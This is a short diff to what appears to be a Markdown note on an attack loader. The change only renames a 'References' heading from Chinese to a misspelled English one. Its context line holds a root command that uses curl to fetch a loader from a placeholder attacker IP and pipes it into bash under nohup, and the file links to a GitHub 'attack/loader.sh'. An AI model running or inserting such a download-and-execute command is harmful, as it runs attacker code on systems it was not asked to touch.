@@ -29,7 +29,7 @@ root@debian:~# nohup curl -fsSL http://[attack_ip]/upload/loader|bash -sh > /dev
 
 ---
 
-参考链接
+Refrences
 
 - [Loader](https://github.com/jadensalas469466/tools/blob/main/attack/loader.sh)
 
